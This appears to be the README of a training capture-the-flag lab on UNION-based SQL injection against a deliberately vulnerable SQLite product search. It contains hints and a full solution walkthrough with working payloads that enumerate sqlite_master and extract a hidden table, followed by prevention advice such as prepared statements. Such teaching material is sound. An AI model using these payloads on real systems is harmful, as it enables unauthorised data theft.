# SQL Injection Lab - UNION-Based Data Extraction

## 📚 Description

This lab demonstrates a **UNION-Based SQL Injection** vulnerability in a product search application. The flag is stored in a hidden database table that can only be accessed through SQL injection using the UNION operator.

**Difficulty Level:** Easy
**Technique:** UNION-Based SQL Injection (Data Extraction from Hidden Table)

## 🎯 Learning Objectives

After completing this lab, you will understand:

1. How UNION-based SQL injection works
2. How to discover hidden tables and columns
3. How to match column counts and data types in UNION queries
4. How to extract sensitive data from separate database tables
5. The importance of not exposing database structure to users

## 🚀 How to Run

### Using Docker Compose (Recommended)

```bash
# Build and start the container
docker-compose up -d

# Find the assigned port
docker-compose ps
```

### Using Docker Build

```bash
# Build the image
docker build -t sqli-lab-union .

# Run the container with random port mapping
docker run -d -p 0:80 --name sqli-lab-union sqli-lab-union

# Find the assigned port
docker port sqli-lab-union
```

### Access the Lab

Once running, open your browser and navigate to:
```
http://localhost:<assigned_port>
```

## 🎮 Challenge

Your goal is to extract the flag from a **hidden database table** called `secret_config` using UNION-based SQL injection.

### What You Know

- The search query returns results from the `products` table
- The query structure is: `SELECT id, name, price FROM products WHERE name LIKE '%<search>%'`
- The flag is stored in a hidden table called `secret_config`
- You need to use UNION to combine results from both tables

### Expected Query Structure

The application constructs SQL queries like this:

```sql
SELECT id, name, price FROM products WHERE name LIKE '%<SEARCH>%'
```

## 💡 Hints

<details>
<summary>Hint 1: Understanding UNION</summary>

The UNION operator combines the result sets of two or more SELECT statements.
For UNION to work, both queries must have the same number of columns.
</details>

<details>
<summary>Hint 2: Column Count</summary>

Start by determining how many columns the original query returns.
Try: `' UNION SELECT 1,2,3 --` and increment the numbers.
</details>

<details>
<summary>Hint 3: Finding Column Count</summary>

Use ORDER BY to find column count:
- `search=' ORDER BY 1 --` (works)
- `search=' ORDER BY 2 --` (works)
- `search=' ORDER BY 4 --` (error = only 3 columns)
</details>

<details>
<summary>Hint 4: Discovering Tables</summary>

In SQLite, table names are stored in `sqlite_master`:
```sql
SELECT name FROM sqlite_master WHERE type='table'
```
</details>

<details>
<summary>Hint 5: Discovering Columns</summary>

In SQLite, column info is in sqlite_master:
```sql
SELECT sql FROM sqlite_master WHERE type='table'
```
</details>

<details>
<summary>Hint 6: Building the UNION Payload</summary>

Once you know the table name, construct a UNION query:
```sql
' UNION SELECT config_key, config_value, created_at FROM secret_config --
```
</details>

<details>
<summary>Hint 7: Matching Column Types</summary>

The original query has:
- Column 1: INTEGER (id)
- Column 2: TEXT (name)
- Column 3: REAL (price)

Your UNION query should have compatible types.
</details>

## 🏁 Success Criteria

You have successfully completed the lab when:

- [ ] You discovered the hidden `secret_config` table
- [ ] You extracted data from it using UNION injection
- [ ] The flag (IDS{...}) appears in the search results
- [ ] You understand the UNION payload you used

## 🔧 Solution Walkthrough

<details>
<summary>Click to reveal the solution</summary>

### Step 1: Determine Column Count

Try ORDER BY to find the number of columns:

```
search=' ORDER BY 1 --   (works)
search=' ORDER BY 2 --   (works)
search=' ORDER BY 3 --   (works)
search=' ORDER BY 4 --   (error!)
```

Result: **3 columns**

### Step 2: Test UNION Injection

```
search=' UNION SELECT 1,2,3 --
```

This creates:
```sql
SELECT id, name, price FROM products WHERE name LIKE '%' UNION SELECT 1,2,3 --%'
```

### Step 3: Discover Hidden Tables

Query sqlite_master:
```
search=' UNION SELECT name, sql, 3 FROM sqlite_master WHERE type='table' --
```

This reveals tables like `products` and `secret_config`.

### Step 4: Get Table Structure

```
search=' UNION SELECT sql, 2, 3 FROM sqlite_master WHERE name='secret_config' --
```

This shows:
```sql
CREATE TABLE secret_config (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    config_key TEXT UNIQUE NOT NULL,
    config_value TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)
```

### Step 5: Extract the Flag

Now use UNION to extract from the hidden table:

**Option A: Extract by column names**
```
search=' UNION SELECT id, config_key, config_value FROM secret_config --
```

**Option B: If that doesn't match column types, try different mapping**
```
search=' UNION SELECT config_key, config_value, created_at FROM secret_config --
```

**Option C: Extract all config values**
```
search=' UNION SELECT 1, config_value, 3 FROM secret_config WHERE config_key='admin_flag' --
```

### Working Payloads

**Simplest Payload:**
```
search=' UNION SELECT 1, config_value, 3 FROM secret_config WHERE config_key='admin_flag' --
```

**Full Table Extraction:**
```
search=' UNION SELECT id, config_key, config_value FROM secret_config --
```

### Why It Works

The payload injects:
```sql
SELECT id, name, price FROM products WHERE name LIKE '%' UNION SELECT 1, config_value, 3 FROM secret_config WHERE config_key='admin_flag' --%'
```

This:
1. Closes the LIKE clause with `%`
2. Adds UNION to combine results
3. Returns the flag value in column 2 (name position)
4. Comments out the rest with `--`

The flag appears as a product name in the results!

</details>

## 🛡️ Prevention

UNION-based SQL Injection can be prevented by:

1. **Using Prepared Statements**:
```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE name LIKE ?");
$stmt->execute(["%{$search}%"]);
```

2. **Input Validation** - Whitelist allowed characters

3. **Principle of Least Privilege** - Limit database user permissions

4. **Avoid Displaying Database Errors** - Use generic error messages

## 📝 Notes

- This lab is for **educational purposes only**
- The flag is dynamically generated on each container start
- Error messages are intentionally verbose for learning
- No WAF or rate limiting is implemented (Easy difficulty)
- Check the HTML source for additional hints!

## 🔗 Resources

- [PortSwigger SQL Injection UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [SQLite Master Table Documentation](https://www.sqlite.org/schematab.html)

---

**Author:** IDS – CyberSec Academy Lab Authoring Guideline
**For:** Educational CTF / Internal Lab Training Only
